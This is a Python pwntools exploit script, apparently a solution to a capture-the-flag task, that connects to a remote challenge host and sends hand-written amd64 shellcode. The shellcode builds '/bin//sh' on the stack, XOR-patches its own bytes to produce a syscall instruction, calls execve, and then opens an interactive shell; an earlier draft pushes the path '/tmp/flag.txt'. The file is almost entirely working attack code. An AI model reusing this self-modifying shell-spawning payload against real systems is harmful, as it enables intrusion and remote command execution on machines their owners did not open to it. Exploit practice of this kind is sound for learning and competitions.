from pwn import *
#io=process("./smiyc")

io=remote("tasks.aeroctf.com",33001)
context.arch='amd64'

#xor eax,eax
#inc eax
#inc eax
#xor rsi,rsi
#xor rdx,rdx
#push rdx
#          syscall
shell=asm("""
          push rbx
          push rbx
          push 0x7478742e
          push 0x67616c66
          push 0x2f706d74
          push 0x2f
          push rsp
          pop rdi
""")

shell="a"

shell=asm("""
       pop rcx
       push rbx
       push rbx
       push 0x6e69622f
       push 0x68732f2f
       pop rdx
       push rbx
       push rsp
       pop rcx
       xor [rcx+12],edx
       pop rsi
       push rsi
       pop rdx
       push rsp
       pop rdi
       push 15
       pop rcx
       xor byte ptr [rax+0x25],cl
       pop rax
       pop rax
       pop rax
       push 0x3b
       pop rax
""")

shell+="\x0f\x0a"


print len(shell)

io.sendline(shell)
io.recv(3)
#gdb.attach(io)
io.sendline("R8S05-06L99C1")
io.interactive()
